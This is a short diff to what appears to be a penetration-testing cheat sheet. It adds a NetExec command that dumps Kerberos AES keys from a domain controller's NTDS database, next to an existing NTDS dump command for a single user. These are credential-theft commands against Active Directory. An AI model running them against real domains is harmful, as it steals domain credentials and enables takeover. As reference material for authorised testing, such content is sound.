@@ -1113,6 +1113,11 @@ NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> 
 ```shell
 NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> --ntds --user <AD_user>
 ```
+
+#### Dump a aeskeys
+```shell
+NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> --ntds --kerberos-keys
+```
 </details> 
 
 # Remote Code Execution
